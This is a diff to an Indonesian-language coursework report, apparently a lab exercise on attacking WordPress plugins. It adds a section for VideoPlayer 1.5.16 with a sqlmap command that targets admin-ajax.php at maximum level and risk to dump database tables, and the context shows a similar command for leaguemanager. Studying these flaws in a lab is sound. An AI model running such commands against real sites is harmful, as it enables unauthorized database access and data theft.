@@ -161,6 +161,16 @@ python sqlmap.py --url "http://alamat_site?league_id=1&season=Winter" --level 5 
 ![leaguemanager 12](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables13.png)
 ![leaguemanager 14](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables15.png)
 
+#### Plugin - VideoPlayer 1.5.16
+
+- Buka terminal pada folder dimana sqlmap berada, jalankan perintah:<pre>
+python sqlmap.py --url "http://alamat_site?/wp-admin/admin-ajax.php" --data="action=spAjaxResults&pollid=1" --level 5 --risk 3 --dbms=mysql --tables
+</pre>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
+
+![videoplayer 1](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/videoplayer1.png)
+![videoplayer 2](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/videoplayer2.png)
+
 ## Kesimpulan dan Saran
 
 ### Kesimpulan
